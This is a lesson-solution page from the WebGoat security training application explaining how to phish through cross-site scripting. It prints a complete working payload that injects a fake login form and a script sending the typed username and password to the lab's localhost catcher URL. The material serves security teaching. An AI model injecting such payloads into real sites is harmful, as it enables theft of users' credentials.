<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Phising with XSS</title>
<link rel="stylesheet" type="text/css" href="lesson_solutions/formate.css">
</head>
<body>
<p><b>Lesson Plan Title:</b> Phishing with XSS</p>

<p><b>Concept / Topic To Teach:</b><br/>
It is always a good practice to validate all input on the 
server side. XSS can occur when unvalidated user input is used 
in an HTTP response. With the help of XSS you can do a Phishing 
Attack and add content to a page which looks official. It is very 
hard for a victim to determinate that the content is malicious.
</p> 

<p><b>General Goal(s):</b><br/>
The user should be able to add a form asking for username 
and password. On submit the input should be sent to 
http://localhost/WebGoat/catcher?PROPERTY=yes&user=catchedUserName&password=catchedPasswordName
</p>

<b>Solution:</b><br/>
With XSS it is possible to add further elements to an existing Page.
This solution consists of two parts you have to combine:
<ul>
<li>A form the victim has to fill in</li>
<li>A script which reads the form and sends the gathered information to the attacker</li>
</ul>
A Form with username and password could look like this:<br/>
<p>
&lt;/form&gt;&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H3
&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot;
name = &quot;pass&quot;&gt;&lt;br&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;
<br/><br/>Search for this term and you will see that a form is added to the page since the search field accepts HTML.
<br/>The initial &lt;/form&gt; tag is to terminate the original search form.
</p>
Now you need a script:
<p>
&lt;script&gt;function hack(){ XSSImage=new Image; XSSImage.src=&quot;<font color="blue">http://localhost/WebGoat/</font>catcher?PROPERTY=yes&amp;user=&quot;+
document.phish.user.value + &quot;&amp;password=&quot; + document.phish.pass.value + &quot;&quot;; alert(&quot;Had this been a real attack... Your credentials were just stolen.
User Name = &quot; + document.phish.user.value + &quot;Password = &quot; +  document.phish.pass.value);}
&lt;/script&gt;
</p>
<p>
This script will read the input from the form and send it to the catcher of WebGoat.<br/>
The text <font color="blue">in blue</font> should match what is in your address bar. If you are using ports and/or webscarab, it may be different.<br/>
The last step is to put things together. Add a Button to the form which
calls the script. You can reach this with the onclick="myFunction()" handler:
</p>
<p>
&lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;
<p>
The final String looks like this:<br/>
&lt;/form&gt;&lt;script&gt;function hack(){ XSSImage=new Image; XSSImage.src=&quot;<font color="blue">http://localhost/WebGoat/</font>catcher?PROPERTY=yes&amp;user=&quot;+
document.phish.user.value + &quot;&amp;password=&quot; + document.phish.pass.value + &quot;&quot;; alert(&quot;Had this been a real attack... Your credentials were just stolen.
User Name = &quot; + document.phish.user.value + &quot;Password = &quot; +  document.phish.pass.value);}
&lt;/script&gt;&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H3
&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot;
name = &quot;pass&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;
</p>
Search for this String and you will see a form asking for your username and password.
Fill in these fields and click on the Login Button, which completes the lesson.<br/><br/>
<img src="lesson_solutions/Phishing_files/image001.jpg"><br/>
<font size="2"><b>New login field after submitting the script.</b></font><br/><br/><br/>
</body>
</html>
